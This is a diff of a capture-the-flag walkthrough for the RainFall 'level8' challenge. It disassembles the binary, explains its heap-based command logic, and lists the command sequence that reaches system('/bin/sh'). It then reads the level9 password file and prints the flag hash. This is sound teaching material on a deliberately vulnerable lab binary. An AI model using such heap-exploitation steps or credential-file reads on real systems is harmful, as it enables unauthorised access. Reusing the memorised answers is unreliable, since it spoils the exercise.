@@ -1,19 +1,81 @@
 # By checking the level8 program at the root of the repository we can see that he's waiting for entry in a loop
-# By checking the code, we can found that it's waiting for some 'commands' in conditions by usiing memcmp and executing some things like malloc, strdup, free or fwrite and system
-# 
+# By checking the code, we can found that it's waiting for some 'commands' in conditions by using memcmp and executing some things like malloc, strdup, free or fwrite and system
+# The commands are: "auth ", "reset", "service" and login
+
+# By checking the code we can found the line that's interesting:
+
+level8@RainFall:~$ gdb ./level8
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048564 <+0>:	push   %ebp
+   0x08048565 <+1>:	mov    %esp,%ebp
+   0x08048567 <+3>:	push   %edi
+   0x08048568 <+4>:	push   %esi
+    ...
+   0x080486ee <+394>:	movl   $0x8048833,(%esp)
+   0x080486f5 <+401>:	call   0x8048480 <system@plt>
+   ...
+   0x08048736 <+466>:	pop    %edi
+   0x08048737 <+467>:	pop    %ebp
+   0x08048738 <+468>:	ret    
+End of assembler dump.
+
+# By checking what argument the function system launch we can see that's what we need
+
+(gdb) x/s 0x8048833
+0x8048833:	 "/bin/sh"
+
+# By checking the code we can found that the command "auth " (the space is important here because the condition check for a string of 5 bytes and auth is 4)
+# Do a malloc of auth of size 4 and init the global variable auth by 0 (null)
+# After that, it checks for the size of our buffer and if it's <= 30, does a strcpy of buffer in auth
+# The command "reset" only free auth
+# The command "service" do a strdup of buffer
+# The command "login" will executes system("/bin/sh") if the pointer at char[32] exists
+# If the pointer doesn't exists it will use fwrite to write "Password:\n" in stdout and noting else, useless for us some
+#
+# Now we know that we have to executes some commands before executing login and executes /bin/sh
+# The thing that we haven't talk is the printf and fgets part, as we said at the begining of this walkthrough
+# the program is waiting for us to write something and it's looping in the main function
+# Every loop it will write the address pointer of the auth and service global variables and waits for getting something in stdin (our exploit prompt)
+# The buffer size can't exceed 128 bytes and the result will be save in our buffer
+
+# We supposed that we have to fill our buffer of 32 bytes or more, let's try this
+# We first have to initiate our auth pointer by calling the "auth " command
 
 level8@RainFall:~$ ./level8
 (nil), (nil) 
 auth 
 0x804a008, (nil) 
-auth 
-0x804a018, (nil) 
+
+# Now initiate our service pointer
+
+...
 service
-0x804a018, 0x804a028 
+0x804a008, 0x804a018 
+...
+
+# We can watch the padding of our pointers due to mallocs
+# The point here is to fill the 32 bytes of buffer, we can juste execute one more time service to do that and login to check if it works
+
 service
-0x804a018, 0x804a038 
+0x804a008, 0x804a028 
 login
+$
+
+# It works !
+
 $ whoami
 level9
 $ cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+# The second thing we can do is to auth one time to initiate our buffer then call service command by adding lot of char behind to fill our buffer
+
+level8@RainFall:~$ ./level8
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+serviceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+0x804a008, 0x804a018 
+login
+$
